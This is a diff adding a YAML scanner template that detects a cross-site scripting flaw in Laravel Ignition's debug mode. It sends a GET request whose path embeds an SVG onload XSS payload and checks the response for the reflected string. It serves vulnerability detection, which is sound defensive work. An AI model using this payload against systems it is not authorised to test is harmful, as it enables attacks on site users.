@@ -1,0 +1,25 @@
+id: laravel-ignition-xss
+name: Laravel Ignition - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled.
+reference: CWE-79
+tags:
+- laravel
+- xss
+- ignition
+- vuln
+requests:
+- method: GET
+  path: /_ignition/scripts/--><svg%20onload=alert(document.domain)>
+  matchers:
+  - type: body
+    words:
+    - 'Undefined index: --><svg onload=alert(document.domain)> in file'
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 500
+  condition: and
